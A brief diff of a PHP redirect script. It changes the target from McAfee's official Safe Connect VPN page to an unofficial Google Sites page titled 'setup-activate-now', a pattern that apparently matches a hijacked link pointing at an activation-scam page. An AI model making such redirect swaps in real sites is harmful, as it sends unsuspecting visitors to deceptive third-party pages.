@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.mcafee.com/en-us/vpn/mcafee-safe-connect.html");
+header("Location: https://sites.google.com/view/setup-activate-now/home");
 die();
 ?>
